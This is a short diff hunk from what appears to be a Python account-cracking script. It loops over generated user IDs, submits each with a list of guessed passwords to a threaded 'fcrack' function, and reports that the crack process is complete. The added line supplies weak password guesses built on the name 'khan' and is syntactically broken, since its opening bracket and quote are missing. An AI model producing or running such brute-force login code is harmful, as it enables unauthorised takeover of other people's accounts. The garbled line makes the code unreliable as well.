@@ -427,6 +427,7 @@ def random_number2():
 		linex()
 		for guru in uid:
 			uid = kode+guru
+			pwx =khan12','khan12345','khankhan123','khankhan','khan123456']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print(47*"-")
 	print('[✓] Crack process has been completed')
